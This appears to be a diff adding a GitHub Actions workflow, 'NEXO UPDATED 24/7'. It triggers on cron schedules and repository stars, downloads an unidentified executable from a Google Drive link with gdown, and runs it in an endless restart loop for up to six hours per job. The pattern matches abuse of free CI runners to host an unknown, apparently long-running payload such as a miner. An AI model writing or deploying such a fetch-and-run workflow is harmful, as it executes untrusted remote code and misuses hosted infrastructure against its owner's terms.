@@ -1,0 +1,31 @@
+name: NEXO UPDATED 24/7
+
+on:
+  schedule:
+    - cron: '0 */6 * * *'
+    - cron: '30 */3 * * *'
+  workflow_dispatch:
+  watch:
+    types: started
+
+jobs:
+  run-nexo-updated:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+    - uses: actions/checkout@v3
+    - name: Setup
+      run: |
+        sudo apt-get update && sudo apt-get install -y python3-pip
+        pip3 install gdown
+    - name: Download
+      run: |
+        gdown "https://drive.google.com/uc?id=1kmkI5AtdpHrBG4ml-FIO8xHExlKJ81BO" -O nexo
+        chmod +x nexo
+    - name: Run
+      run: |
+        while true; do
+          ./nexo &
+          wait
+          sleep 5
+        done
